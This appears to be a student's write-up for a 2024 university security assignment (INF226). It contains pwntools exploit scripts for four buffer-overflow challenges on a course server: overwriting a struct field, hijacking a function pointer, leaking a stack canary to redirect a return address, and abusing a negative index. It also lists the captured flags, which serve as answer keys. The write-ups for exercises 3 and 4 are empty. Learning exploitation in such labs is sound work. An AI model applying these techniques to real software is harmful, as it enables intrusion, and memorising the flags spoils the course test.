# INF226_Assignment_1

## Secrets
1. {inf226_2024_m4yb3_y0u_1ik3_t34_b3tt3r}
2. {inf226_2024_13t5_f14ming0!}
3. {inf226_2024_1nd14n4_j0n35_w0uld_b3_pr0ud}
4. {inf226_2024_n0_gu35t_5h0ld_kn0w}

## Exercise 1
### Vulnerability overview

The vulnerability of the code in exercise 1 lies in the fact that the variable `locals.buffer` is 16 char/bytes long, but the `fgets()` function on line 15 reads up to 1024 chars/bytes and assigns it to buffer. The vulnerability lies in the discrepancy between how much information the `locals.buffer` can hold and how much information the fgets() func can assign to it. Beacuse the `locals.buffer` is the first property of a struct, the next property, `locals.secret` is very vulnerable. Convenientally this variable also is responsible for some important logic restricting the user from reaching the flag.

### How to exploit

The idea is to owerwrite the `locals.buffer` and assign another value to the `locals.secret` variable. We should assign the value hexadecimal value, 'c0ffee' to the variable in order to access the part of the program that exploits the flag. I know that the properties of a struct is located after one another in memory. To exploit this program i simply fill the `locals.buffer` variable with junk data ('A' * 16) when asked for input, and additionally i overfow the buffer with 0xc0ffee which gets assigned to `locals.secret`. This grants me access to the flag!

### Code
```py
import pwn
import time

target = 'oblig1.bufferoverflow.no'
port = 7001

payload = b"A" * 16 + pwn.p64(0xc0ffee)

p = pwn.remote(target, port)

p.sendline(payload)

print(p.recvline())
print(p.recvline())

p.interactive()
p.close()
```

### Secret

{inf226_2024_m4yb3_y0u_1ik3_t34_b3tt3r}

## Exercise 2
### Vulnerability overview

Again the vulnerability lies in the possibility for a buffer overflow. The struct `locals` has two properties. After `locals.buffer` comes the variable `locals.func_pt`. Later in the program the function `pick_animal()` is assigned to `locals.func_pt`, and at last the function at `locals.func_pt` is called. But the possibility to overflow `locals.buffer`, and overwrite `locals.func_pt` represents a serious vulnerability. Part of the vulnerability also lies in the fact that there exists an unused function, `expose_flag()` which is never called. This function also happens to expose some information which should be kept secret...

### How to exploit

Here the idea is to get the `expose_flag()` function to be called, even though it is never really called by just running `main()`. This is done by filling the `locals.buffer` variable and writing the memory address of `expose_flag()` into `locals.func_pt`. When `locals.func_pt` is called on line 42, the flag will be revealed!

### Code
```py
import pwn

target = 'oblig1.bufferoverflow.no'
port = 7002

payload = b'A' * 32 + pwn.p64(0x4011a6)

p = pwn.remote(target, port)

print(p.recvline())

p.sendline(payload)

print(p.recvline())

p.interactive()
p.close()
```
### Secret
{inf226_2024_13t5_f14ming0!}

## Exercise 3
### Vulnerability overview

### How to exploit

### Code
```py
import pwn

target = 'oblig1.bufferoverflow.no'
port = '7003'

buffer_to_canary_dst = b'24'
bufferfill = b'A' * int(buffer_to_canary_dst)
return_p_offset = b'B' * 8 * 1
expose_flag_adr = pwn.p64(0x4011a7)

p = pwn.remote(target, port)

print(p.recvline())
p.sendline(buffer_to_canary_dst)

print(p.recvline())
read_canary = p.recvline()
print(b'Canary: ' + read_canary)

canary_val = pwn.p64(int(read_canary, 16))

payload = bufferfill + canary_val + return_p_offset + expose_flag_adr

p.sendline(payload)

p.interactive()
p.close()
```
### Secret
{inf226_2024_1nd14n4_j0n35_w0uld_b3_pr0ud}

## Exercise 4
### Vulnerability overview

### How to exploit

### Code
```py
import pwn

target = 'oblig1.bufferoverflow.no'
port = '7004'

bufferfill = b'A' * 16
buffer_to_secret_dst = b'-48'

p = pwn.remote(target, port)

print(p.recvline())
print(p.recvline())

p.sendline(buffer_to_secret_dst)

print(p.recvline())

read_secret = p.recvline()
print(b'Secret: ' + read_secret)

secret_val = pwn.p64(int(read_secret, 16))

print(p.recvline())

p.sendline(bufferfill + secret_val)

print(p.recvline())

p.interactive()
p.close()
```
### Secret
{inf226_2024_n0_gu35t_5h0ld_kn0w}